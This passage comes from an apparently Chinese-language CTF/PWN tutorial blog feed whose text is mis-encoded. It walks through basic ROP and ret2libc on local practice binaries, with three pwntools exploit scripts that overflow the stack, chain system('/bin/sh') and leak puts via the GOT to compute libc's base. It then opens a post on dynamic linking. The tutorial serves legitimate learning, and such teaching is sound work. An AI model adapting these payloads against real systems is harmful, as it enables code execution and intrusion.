ˆé‡Œé¢å†™å…¥shellcodeäº†ï¼Œé€šè¿‡å‰é¢å¯¹åŠ¨æ€é“¾æ¥çš„å­¦ä¹ çŸ¥é“åŠ¨æ€é“¾æ¥çš„ç¨‹åºåœ¨è¿è¡Œæ—¶æ‰ä¼šé“¾æ¥å…±äº«æ¨¡å—ï¼Œç”¨lddå‘½ä»¤æŸ¥çœ‹ç¨‹åºéœ€è¦çš„å…±äº«æ¨¡å—ï¼š<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125143544.png" alt="Pasted image 20250125143544"><br>ç¨‹åºä¾èµ–çš„æ˜¯ libc.so.6 è¿™ä¸ªå…±äº«æ¨¡å—ï¼Œè¿™ä¸ªå…±äº«æ¨¡å—é‡Œé¢æä¾›äº†å¤§é‡å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰§è¡Œ system(â€œ/bin/shâ€) æ¥æ‰“å¼€shellï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦åœ¨ libc ä¸­æ‰¾åˆ°äº† system() å‡½æ•°å’Œ â€œ/bin/shâ€ å­—ç¬¦ä¸²çš„åœ°å€å°±å¯ä»¥æ§åˆ¶è¿”å›åœ°å€æ‰“å¼€shellã€‚</p><blockquote><p>è¿™é‡Œå¿˜å…³ä¿æŠ¤äº†ï¼ŒåŸºå€æ˜¯é”™è¯¯çš„ï¼Œexpä¸­æ˜¯æ­£ç¡®çš„</p><h4 id="1-æ‰¾system-å‡½æ•°"><a href="#1-æ‰¾system-å‡½æ•°" class="headerlink" title="1.æ‰¾system()å‡½æ•°"></a>1.æ‰¾system()å‡½æ•°</h4><p>å› ä¸ºå…³é—­äº† ASLR ï¼Œå…±äº«åº“çš„åŠ è½½åŸºå€å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œåªè¦çŸ¥é“ system() å‡½æ•°åœ¨å…±äº«åº“ä¸­çš„åç§»å°±èƒ½å¤Ÿç®—å‡º system() å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚ä½¿ç”¨ objdump -T libc.so.6 å‘½ä»¤å°±å¯ä»¥æ˜¾ç¤ºå¤„æ‰€æœ‰çš„åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨ã€‚<br><code>objdump -T libc.so.6 |grep system</code><br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125143504.png" alt="Pasted image 20250125143504"><br>system()å‡½æ•°åç§»ä¸º0x00050430ï¼ŒåŠ ä¸ŠåŸºå€0xed4d2000ï¼Œä¸¤è€…ç›¸åŠ å°±æ˜¯è¿™ä¸ªåœ°å€å°±æ˜¯libcåŠ è½½åˆ°å†…å­˜ç©ºé—´å system() å‡½æ•°çš„çœŸå®åœ°å€ã€‚</p></blockquote><h4 id="2-æŸ¥æ‰¾-bin-sh-å­—ç¬¦ä¸²"><a href="#2-æŸ¥æ‰¾-bin-sh-å­—ç¬¦ä¸²" class="headerlink" title="2.æŸ¥æ‰¾ /bin/sh å­—ç¬¦ä¸²"></a>2.æŸ¥æ‰¾ /bin/sh å­—ç¬¦ä¸²</h4><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125144229.png" alt="Pasted image 20250125144229"><br>åŒç†å¯ç®—å‡ºçœŸå®åœ°å€</p><h4 id="3-è¦†ç›–è¿”å›åœ°å€"><a href="#3-è¦†ç›–è¿”å›åœ°å€" class="headerlink" title="3.è¦†ç›–è¿”å›åœ°å€"></a>3.è¦†ç›–è¿”å›åœ°å€</h4><p>cyclic<br>offsetä¸º140</p><h4 id="æ„é€ payload"><a href="#æ„é€ payload" class="headerlink" title="æ„é€ payload"></a>æ„é€ payload</h4><p>è¿”å›åœ°å€å¤„æ”¾ç½® system() å‡½æ•°çš„åœ°å€ä½¿å½“å‡½æ•°è¿è¡Œå®Œæ¯•æ—¶è·³è½¬åˆ° system() å‡½æ•°å¤„ç»§ç»­æ‰§è¡Œï¼Œ<strong>å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹æ˜¯å…ˆå°†å‚æ•°å…¥æ ˆï¼Œæ¥ç€ä¿å­˜è¿”å›åœ°å€ï¼Œæœ€åcall system</strong>ã€‚system_ret_addr æ˜¯ system() å‡½æ•°çš„åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æ‰“å¼€shellï¼Œ<strong>æ‰€ä»¥è¿™ä¸ªè¿”å›åœ°å€éšä¾¿è®¾ç½® ä¸€ä¸ªå€¼å°±å¯ä»¥</strong>ã€‚binsh_addr æ”¾ç½®çš„æ˜¯å‚æ•° â€œ/bin/shâ€ å­—ç¬¦ä¸²çš„åœ°å€<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">sh = process(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x00050430</span> + <span class="number">0xf7d70000</span></span><br><span class="line"><span class="built_in">print</span>(system_addr)</span><br><span class="line">binsh_addr  = <span class="number">0x001c4de8</span> + <span class="number">0xf7d70000</span></span><br><span class="line"><span class="built_in">print</span>(binsh_addr)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">sh, payload</span>):</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">pwn(sh, payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="ç¤ºä¾‹2-bssæ®µä¸Šå†™â€™-bin-shâ€™"><a href="#ç¤ºä¾‹2-bssæ®µä¸Šå†™â€™-bin-shâ€™" class="headerlink" title="ç¤ºä¾‹2(bssæ®µä¸Šå†™â€™/bin/shâ€™)"></a>ç¤ºä¾‹2(bssæ®µä¸Šå†™â€™/bin/shâ€™)</h3><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127121126.png" alt="Pasted image 20250127121126"><br>checksecï¼ŒNXå¼€å¯ï¼Œä¸èƒ½å¾€æ ˆä¸Šå†™ä¸œè¥¿<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127120758.png" alt="Pasted image 20250127120758"><br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127120731.png" alt="Pasted image 20250127120731"><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127121002.png" alt="Pasted image 20250127121002"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, system_plt, buf2, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>payloadè§£è¯»ï¼š<br>é¦–å…ˆä½¿ç”¨112ä¸ªAå­—ç¬¦å¡«å……æ ˆï¼Œä½¿æ ˆå‘ç”Ÿæº¢å‡ºï¼Œå†ç”¨getså‡½æ•°çš„pltåœ°å€æ¥è¦†ç›–åŸè¿”å›åœ°å€ï¼Œä½¿ç¨‹åºæµæ‰§è¡Œåˆ°getså‡½æ•°ï¼Œå‚æ•°å°±æ˜¯bssæ®µçš„åœ°å€ï¼ˆbssæ®µçš„å˜é‡ï¼‰ï¼Œç›®çš„æ˜¯ä¸ºäº†ä½¿ç”¨getså‡½æ•°å°†/bin/shå†™å…¥åˆ°bssæ®µä¸­ã€‚<br>æ¥ä¸‹æ¥åœ¨ä½¿ç”¨systemå‡½æ•°è¦†ç›–getså‡½æ•°çš„è¿”å›åœ°å€ï¼Œä½¿ç¨‹åºæ‰§è¡Œåˆ°systemå‡½æ•°ï¼Œå…¶å‚æ•°ä¹Ÿæ˜¯bssæ®µä¸­çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯/bin/shã€‚<br>æœ€åçš„sh.sendline(â€˜/bin/shâ€™)æ˜¯ä¸ºäº†å°†bssæ®µä¸Šå˜é‡çš„å†…å®¹æ›¿æ¢æˆ/bin/sh(ä¹Ÿå°±æ˜¯è¯´åœ¨æ‰§è¡Œsendline(â€˜/bin/shâ€™)ä¹‹å‰ï¼Œbssæ®µä¸Šçš„å˜é‡æœªè¢«åˆå§‹åŒ–ï¼Œå…¶å†…å®¹ä¸ºç©ºï¼‰ã€‚<br>payloadä¸­ç¬¬ä¸€ä¸ªbuf2æ˜¯getså‡½æ•°çš„å‚æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯systemçš„å‚æ•°</p><blockquote><p>æ³¨ï¼šç¨‹åºçš„èµ°å‘æ˜¯ç”±æ ˆæ¥å†³å®šçš„</p></blockquote><h3 id="ç¤ºä¾‹3ï¼ˆæ— systemåœ°å€å’Œ-bin-shåœ°å€ï¼‰"><a href="#ç¤ºä¾‹3ï¼ˆæ— systemåœ°å€å’Œ-bin-shåœ°å€ï¼‰" class="headerlink" title="ç¤ºä¾‹3ï¼ˆæ— systemåœ°å€å’Œ/bin/shåœ°å€ï¼‰"></a>ç¤ºä¾‹3ï¼ˆæ— systemåœ°å€å’Œ/bin/shåœ°å€ï¼‰</h3><p>checksecï¼Œ32ä½ï¼ŒNXå¼€å¯ï¼Œä¸èƒ½å¾€æ ˆä¸Šå†™ä¸œè¥¿<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127122302.png" alt="Pasted image 20250127122302"><br>cyclicå¾—åˆ°åç§»é‡ä¸º112<br>ç°åœ¨å½“åŠ¡ä¹‹æ€¥å°±æ˜¯å¾—åˆ°systemå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å¾—åˆ°å‘¢ï¼Ÿè¿™é‡Œå°±ä¸»è¦åˆ©ç”¨äº†ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><blockquote><p>1.systemå‡½æ•°å±äºlibcï¼Œè€Œ<strong>libc.soåŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„</strong>ã€‚<br>2.å³ä½¿ç¨‹åºæœ‰ASLRä¿æŠ¤ï¼Œ<strong>ä¹Ÿåªæ˜¯é’ˆå¯¹äºåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½çš„12ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜</strong>ã€‚è€Œlibcåœ¨githubä¸Šæœ‰äººè¿›è¡Œæ”¶é›†,å¦‚ä¸‹[<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a>]</p></blockquote><p>ä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·ç½‘ç«™ï¼š[<a href="https://libc.blukat.me/]ï¼Œè¿™ä¸ªç½‘å€çš„æ•°æ®åº“åŸºäºlibc-database">https://libc.blukat.me/]ï¼Œè¿™ä¸ªç½‘å€çš„æ•°æ®åº“åŸºäºlibc-database</a></p><p>åªè¦å¾—åˆ°libcçš„ç‰ˆæœ¬ï¼Œå¯çŸ¥é“systemå‡½æ•°å’Œ/bin/shçš„åç§»é‡ã€‚çŸ¥é“åç§»é‡åï¼Œå†æ‰¾åˆ°libcçš„åŸºåœ°å€ï¼Œå°±å¯ä»¥å¾—åˆ°systemå‡½æ•°çš„çœŸå®åœ°å€ï¼Œå°±å¯ä»¥åšæˆ‘ä»¬æƒ³è¦åšçš„äº‹æƒ…äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªå…¬å¼æ¥å¾—åˆ°systemçš„çœŸå®åœ°å€ã€‚</p><blockquote><p>libcåŸºåœ°å€+å‡½æ•°åç§»é‡ï¼å‡½æ•°çœŸå®åœ°å€</p></blockquote><p>å¯ä»¥æ³„éœ²ä¸€ä¸ªå‡½æ•°çš„çœŸå®åœ°å€ï¼Œç„¶åæ ¹æ®å…¬å¼å¯ä»¥å¾—åˆ°libcçš„åŸºåœ°å€ï¼Œå› ä¸ºçŸ¥é“äº†libcç‰ˆæœ¬ï¼Œå°±çŸ¥é“äº†å‡½æ•°åç§»é‡ã€‚</p><p>æˆ‘ä»¬è¯¥å¦‚ä½•æ³„éœ²å‡½æ•°çš„çœŸå®åœ°å€çš„ï¼Œè¿™é‡Œæ¶‰åŠåˆ°äº†libcçš„<strong>å»¶è¿Ÿç»‘å®šæŠ€æœ¯</strong><br>è¦æ³„éœ²å‡½æ•°çš„çœŸå®åœ°å€ï¼Œ<strong><em>ä¸€èˆ¬çš„æ–¹æ³•æ˜¯é‡‡ç”¨gotè¡¨æ³„éœ²ï¼Œå› ä¸ºåªè¦ä¹‹å‰æ‰§è¡Œè¿‡putså‡½æ•°ï¼Œgotè¡¨é‡Œå­˜æ”¾ç€å°±æ˜¯å‡½æ•°çš„çœŸå®åœ°å€äº†ï¼Œè¿™é‡Œç”¨çš„æ˜¯putså‡½æ•°ï¼Œç¨‹åºé‡Œå·²ç»è¿è¡Œè¿‡äº†putså‡½æ•°ï¼ŒçœŸå®åœ°å€å·²ç»å­˜æ”¾åˆ°äº†gotè¡¨å†…ã€‚æˆ‘ä»¬å¾—åˆ°putså‡½æ•°çš„gotåœ°å€åï¼Œå¯ä»¥æŠŠè¿™ä¸ªåœ°å€ä½œä¸ºå‚æ•°ä¼ é€’ç»™putså‡½æ•°ï¼Œåˆ™ä¼šæŠŠè¿™ä¸ªåœ°å€é‡Œçš„æ•°æ®ï¼Œå³putså‡½æ•°çš„çœŸå®åœ°å€ç»™è¾“å‡ºå‡ºæ¥ï¼Œè¿™æ ·å°±å¾—åˆ°äº†putså‡½æ•°çš„çœŸå®åœ°å€ã€‚</em></strong></p><p>è„šæœ¬å¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#å¾—åˆ°putsçš„gotçš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€é‡Œçš„æ•°æ®å³å‡½æ•°çš„çœŸå®åœ°å€ï¼Œå³æˆ‘ä»¬è¦æ³„éœ²çš„å¯¹è±¡</span></span><br><span class="line">puts_plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#putsçš„pltè¡¨çš„åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨putså‡½æ•°æ³„éœ²</span></span><br><span class="line">main_plt_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]<span class="comment">#è¿”å›åœ°å€è¢«è¦†ç›–ä¸ºmainå‡½æ•°çš„åœ°å€ã€‚ä½¿ç¨‹åºè¿˜å¯è¢«æº¢å‡º</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_got_addr = &quot;</span>,<span class="built_in">hex</span>(puts_got_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_plt_addr = &quot;</span>,<span class="built_in">hex</span>(puts_plt_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;main_plt_addr = &quot;</span>,<span class="built_in">hex</span>(main_plt_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(puts_plt_addr)<span class="comment">#è¦†ç›–è¿”å›åœ°å€ä¸ºputså‡½æ•°</span></span><br><span class="line">payload += p32(main_plt_addr)<span class="comment">#è¿™é‡Œæ˜¯putså‡½æ•°è¿”å›çš„åœ°å€ã€‚</span></span><br><span class="line">payload += p32(puts_got_addr)<span class="comment">#è¿™é‡Œæ˜¯putså‡½æ•°çš„å‚æ•°</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure></p><p>æœ€åç†ä¸€ä¸‹æ€è·¯</p><ol><li>æ³„éœ²putså‡½æ•°çš„çœŸå®åœ°å€</li><li>å¾—åˆ°libcçš„ç‰ˆæœ¬</li><li>å¾—åˆ°systemå’Œputså’Œshçš„åç§»ï¼Œè®¡ç®—libcåŸºåœ°å€</li><li>è®¡ç®—systemå’Œshçš„çœŸå®åœ°å€</li><li>æ„é€ payloadä¸ºsystem(â€™/bin/shâ€™ï¼‰</li><li>å†™exp<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127174108.png" alt="Pasted image 20250127174108"></li></ol><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127174002.png" alt="Pasted image 20250127174002"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_plt_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_got_addr = &quot;</span>,<span class="built_in">hex</span>(puts_got_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_plt_addr = &quot;</span>,<span class="built_in">hex</span>(puts_plt_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;main_plt_addr = &quot;</span>,<span class="built_in">hex</span>(main_plt_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(puts_plt_addr)</span><br><span class="line">payload += p32(main_plt_addr)</span><br><span class="line">payload += p32(puts_got_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">sys_offset = <span class="number">0x0050430</span></span><br><span class="line">sh_offset = <span class="number">0x1c4de8</span></span><br><span class="line">puts_offset = <span class="number">0x78140</span></span><br><span class="line"><span class="comment">#æ ¹æ®å…¬å¼  libcåŸºåœ°å€  +  å‡½æ•°åç§»é‡   =  å‡½æ•°çœŸå®åœ°å€   æ¥è®¡ç®—</span></span><br><span class="line">libc_base_addr =  puts_addr-puts_offset<span class="comment">#è®¡ç®—å‡ºlibcåŸºåœ°å€</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_offset&quot;</span>,<span class="built_in">hex</span>(puts_addr-libc_base_addr))</span><br><span class="line">sys_addr = libc_base_addr + sys_offset <span class="comment">#è®¡ç®—å‡ºsystemçš„çœŸå®åœ°å€</span></span><br><span class="line">sh_addr = libc_base_addr + sh_offset <span class="comment">#è®¡ç®—å‡º/bin/shçš„çœŸå®åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;libc_base_addr = &quot;</span>,<span class="built_in">hex</span>(libc_base_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;sys_addr = &quot;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;sh_addr = &quot;</span>,<span class="built_in">hex</span>(sh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(sys_addr) <span class="comment">#è¦†ç›–è¿”å›åœ°å€ä¸ºsystemå‡½æ•°</span></span><br><span class="line">payload += <span class="string">b&quot;AAAA&quot;</span>  <span class="comment">#systemçš„è¿”å›åœ°å€ï¼Œéšä¾¿è¾“ï¼Œå› ä¸ºä¹‹å‰è°ƒç”¨äº†system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload += p32(sh_addr)  <span class="comment">#systemå‡½æ•°å‚æ•°</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p><strong><em>æˆåŠŸgetshell</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€-åŠ¨æ€é“¾æ¥</title>
      <link href="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
      <url>/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆåŠ¨æ€é“¾æ¥ï¼ˆDynamic-linkingï¼‰"><a href="#ä»€ä¹ˆåŠ¨æ€é“¾æ¥ï¼ˆDynamic-linkingï¼‰" class="headerlink" title="ä»€ä¹ˆåŠ¨æ€é“¾æ¥ï¼ˆDynamic linkingï¼‰"></a>ä»€ä¹ˆåŠ¨æ€é“¾æ¥ï¼ˆDynamic linkingï¼‰</h2><p><strong>åŠ¨æ€é“¾æ¥</strong> æ˜¯æŒ‡åœ¨ç¨‹åºè£…è½½æ—¶é€šè¿‡ <strong>åŠ¨æ€é“¾æ¥å™¨</strong> å°†ç¨‹åºæ‰€éœ€çš„æ‰€æœ‰ <strong>åŠ¨æ€é“¾æ¥åº“(Dynamic linking library)</strong> è£…è½½è‡³è¿›ç¨‹ç©ºé—´ä¸­ï¼ˆ ç¨‹åºæŒ‰ç…§æ¨¡å—æ‹†åˆ†æˆå„ä¸ªç›¸å¯¹ç‹¬ç«‹çš„éƒ¨åˆ†ï¼‰ï¼Œ<em>å½“ç¨‹åºè¿è¡Œæ—¶æ‰å°†ä»–ä»¬é“¾æ¥åœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå®Œæ•´ç¨‹åºçš„è¿‡ç¨‹</em>ã€‚å®ƒè¯ç”Ÿçš„æœ€ä¸»è¦çš„åŸå› æ˜¯ <strong>é™æ€é“¾æ¥</strong> å¤ªè¿‡äºæµªè´¹å†…å­˜å’Œç£ç›˜çš„ç©ºé—´ï¼Œå¹¶ä¸”ç°åœ¨çš„è½¯ä»¶å¼€å‘éƒ½æ˜¯æ¨¡å—åŒ–å¼€å‘ï¼Œä¸åŒçš„æ¨¡å—éƒ½æ˜¯ç”±ä¸åŒçš„å‚å®¶å¼€å‘ï¼Œåœ¨ <strong>é™æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ï¼Œä¸€æ—¦å…¶ä¸­æŸä¸€æ¨¡å—å‘ç”Ÿæ”¹å˜å°±ä¼šå¯¼è‡´æ•´ä¸ªè½¯ä»¶éƒ½éœ€è¦é‡æ–°ç¼–è¯‘ï¼Œè€Œé€šè¿‡ <strong>åŠ¨æ€é“¾æ¥</strong> çš„æ–¹å¼å°±æ¨è¿Ÿè¿™ä¸ªé“¾æ¥è¿‡ç¨‹åˆ°äº†ç¨‹åºè¿è¡Œæ—¶è¿›è¡Œã€‚</p><h3 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><p>1ã€<strong>èŠ‚çœå†…å­˜ã€ç£ç›˜ç©ºé—´</strong><br>    ä¾‹å¦‚ç£ç›˜ä¸­æœ‰ä¸¤ä¸ªç¨‹åºï¼Œp1ã€p2ï¼Œä¸”ä»–ä»¬ä¸¤ä¸ªéƒ½åŒ…å« lib.o è¿™ä¸ªæ¨¡å—ï¼Œåœ¨ <strong>é™æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ä»–ä»¬åœ¨é“¾æ¥è¾“å‡ºå¯æ‰§è¡Œæ–‡ä»¶æ—¶éƒ½ä¼šåŒ…å« lib.o è¿™ä¸ªæ¨¡å—ï¼Œè¿™å°±é€ æˆäº†ç£ç›˜ç©ºé—´çš„æµªè´¹ã€‚å½“è¿™ä¸¤ä¸ªç¨‹åºè¿è¡Œæ—¶ï¼Œå†…å­˜ä¸­åŒæ ·ä¹Ÿå°±åŒ…å«äº†è¿™ä¸¤ä¸ªç›¸åŒçš„æ¨¡å—ï¼Œè¿™ä¹Ÿå°±ä½¿å¾—å†…å­˜ç©ºé—´è¢«æµªè´¹ã€‚å½“ç³»ç»Ÿä¸­åŒ…å«å¤§é‡ç±»ä¼¼ lib.o è¿™ç§è¢«å¤šä¸ªç¨‹åºå…±äº«çš„æ¨¡å—æ—¶ï¼Œä¹Ÿå°±ä¼šé€ æˆå¾ˆå¤§ç©ºé—´çš„æµªè´¹ã€‚<em>åœ¨ <strong>åŠ¨æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ï¼Œè¿è¡Œ p1 ï¼Œå½“ç³»ç»Ÿå‘ç°éœ€è¦ç”¨åˆ° lib.o ï¼Œå°±ä¼šæ¥ç€åŠ è½½ lib.o ã€‚è¿™æ—¶æˆ‘ä»¬è¿è¡Œ p2 ï¼Œå°±ä¸éœ€è¦é‡æ–°åŠ è½½ lib.o äº†ï¼Œå› ä¸ºæ­¤æ—¶ lib.o å·²ç»åœ¨å†…å­˜ä¸­äº†ï¼Œç³»ç»Ÿä»…éœ€å°†ä¸¤è€…é“¾æ¥èµ·æ¥ï¼Œæ­¤æ—¶å†…å­˜ä¸­å°±åªæœ‰ä¸€ä¸ª lib.o èŠ‚çœäº†å†…å­˜ç©ºé—´</em>ã€‚<br>2ã€<strong>ç¨‹åºæ›´æ–°æ›´ç®€å•</strong><br>    æ¯”å¦‚ç¨‹åº p1 æ‰€ä½¿ç”¨çš„ lib.o æ˜¯ç”±ç¬¬ä¸‰æ–¹æä¾›çš„ï¼Œç­‰åˆ°ç¬¬ä¸‰æ–¹æ›´æ–°ã€æˆ–è€…ä¸º lib.o æ‰“è¡¥ä¸çš„æ—¶å€™ï¼Œp1 å°±éœ€è¦æ‹¿åˆ°ç¬¬ä¸‰æ–¹æœ€æ–°æ›´æ–°çš„ lib.o ï¼Œé‡æ–°é“¾æ¥ååœ¨å°†å…¶å‘å¸ƒç»™ç”¨æˆ·ã€‚ç¨‹åºä¾èµ–çš„æ¨¡å—è¶Šå¤šï¼Œå°±è¶Šå‘æ˜¾å¾—ä¸æ–¹ä¾¿ï¼Œæ¯•ç«Ÿéƒ½æ˜¯ä»ç½‘ç»œä¸Šè·å–æ–°èµ„æºã€‚åœ¨ <strong>åŠ¨æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ï¼Œç¬¬ä¸‰æ–¹æ›´æ–° lib.o åï¼Œç†è®ºä¸Šåªéœ€è¦è¦†ç›–æ‰åŸæœ‰çš„ lib.o ï¼Œå°±ä¸å¿…é‡æ–°é“¾æ¥æ•´ä¸ªç¨‹åºï¼Œåœ¨ç¨‹åºä¸‹ä¸€æ¬¡è¿è¡Œæ—¶ï¼Œæ–°ç‰ˆæœ¬çš„ç›®æ ‡æ–‡ä»¶å°±ä¼šè‡ªåŠ¨è£…è½½åˆ°å†…å­˜å¹¶ä¸”é“¾æ¥èµ·æ¥ï¼Œå°±å®Œæˆäº†å‡çº§çš„ç›®æ ‡ã€‚<br>3ã€<strong>å¢å¼ºç¨‹åºæ‰©å±•æ€§å’Œå…¼å®¹æ€§</strong><br>    